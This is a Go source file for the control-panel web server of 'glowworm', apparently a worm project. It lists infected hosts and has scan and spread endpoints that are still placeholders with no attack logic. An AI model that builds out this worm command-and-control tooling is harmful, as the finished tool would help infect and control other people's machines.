/*
// Author: Aliasgar Khimani (NovusEdge)
// Project: github.com/ARaChn3/glowworm
//
// Copyright: MIT License
// See the LICENSE file for more info.
*/

// Package server provides the control panel HTTP server.
//
// Serves the embedded React frontend and provides API endpoints
// for monitoring and controlling worm operations.
package server

import (
	"embed"
	"encoding/json"
	"fmt"
	"io/fs"
	"net/http"
	"sync"
	"time"
)

//go:embed dist/*
var frontendFS embed.FS

// Host represents a discovered/infected host.
type Host struct {
	IP        string            `json:"ip"`
	Hostname  string            `json:"hostname,omitempty"`
	OS        string            `json:"os,omitempty"`
	Ports     []int             `json:"ports"`
	Services  map[int]string    `json:"services"`
	Status    string            `json:"status"` // discovered, infected, failed, immune
	LastSeen  time.Time         `json:"last_seen"`
}

// Server is the control panel HTTP server.
type Server struct {
	port  int
	hosts map[string]*Host
	mu    sync.RWMutex
}

// New creates a new control panel server.
func New(port int) *Server {
	return &Server{
		port:  port,
		hosts: make(map[string]*Host),
	}
}

// Start begins serving the control panel.
func (s *Server) Start() error {
	mux := http.NewServeMux()

	// API endpoints
	mux.HandleFunc("/api/hosts", s.handleHosts)
	mux.HandleFunc("/api/scan", s.handleScan)
	mux.HandleFunc("/api/spread", s.handleSpread)

	// Serve embedded frontend
	distFS, err := fs.Sub(frontendFS, "dist")
	if err != nil {
		// Fallback if no dist folder
		mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
			w.Header().Set("Content-Type", "text/html")
			fmt.Fprintf(w, `<!DOCTYPE html>
<html><head><title>glowworm</title></head>
<body style="background:#0a0f0a;color:#4ade80;font-family:monospace;padding:2rem">
<h1>glowworm control panel</h1>
<p>Frontend not built. Run: cd frontend && pnpm build</p>
<p>Then copy frontend/dist to internal/server/dist</p>
</body></html>`)
		})
	} else {
		fileServer := http.FileServer(http.FS(distFS))
		mux.Handle("/", fileServer)
	}

	addr := fmt.Sprintf(":%d", s.port)
	fmt.Printf("Control panel running at http://localhost%s\n", addr)
	return http.ListenAndServe(addr, mux)
}

// AddHost registers a discovered host.
func (s *Server) AddHost(host *Host) {
	s.mu.Lock()
	defer s.mu.Unlock()
	host.LastSeen = time.Now()
	s.hosts[host.IP] = host
}

// UpdateHostStatus updates the status of a host.
func (s *Server) UpdateHostStatus(ip, status string) {
	s.mu.Lock()
	defer s.mu.Unlock()
	if h, ok := s.hosts[ip]; ok {
		h.Status = status
		h.LastSeen = time.Now()
	}
}

func (s *Server) handleHosts(w http.ResponseWriter, r *http.Request) {
	s.mu.RLock()
	defer s.mu.RUnlock()

	hosts := make([]*Host, 0, len(s.hosts))
	for _, h := range s.hosts {
		hosts = append(hosts, h)
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(hosts)
}

func (s *Server) handleScan(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	// ponytail: placeholder - would trigger actual scan
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]string{"status": "scan queued"})
}

func (s *Server) handleSpread(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	// ponytail: placeholder - would trigger actual spread
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]string{"status": "spread queued"})
}
